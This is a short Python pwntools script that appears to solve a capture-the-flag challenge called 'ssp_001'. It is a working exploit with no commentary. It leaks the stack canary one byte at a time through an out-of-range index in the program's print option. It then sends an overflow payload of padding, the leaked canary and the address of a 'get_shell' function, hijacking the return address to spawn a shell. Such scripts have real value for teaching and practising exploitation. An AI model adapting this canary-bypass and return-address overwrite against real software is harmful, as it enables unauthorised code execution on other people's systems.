from pwn import *

p = process("./ssp_001")
e = ELF("./ssp_001")

get_shell = e.symbols["get_shell"]

context.arch = "i386"

canary = b""

i = 131

while i>127:
    p.sendlineafter("> ", "P")
    p.sendlineafter("Element index : ", str(i))
    p.recvuntil(" : ")
    canary += p.recvuntil("\n")[0:2] 
    i = i - 1

canary = int(canary, 16)

payload = b"\x90"*64
payload += p32(canary)
payload += b"\x90"*8
payload += p32(get_shell)

p.sendafter("> ", "E")
p.sendlineafter("Name Size : ", str(len(payload)))
p.sendafter("Name : ", payload)

p.interactive()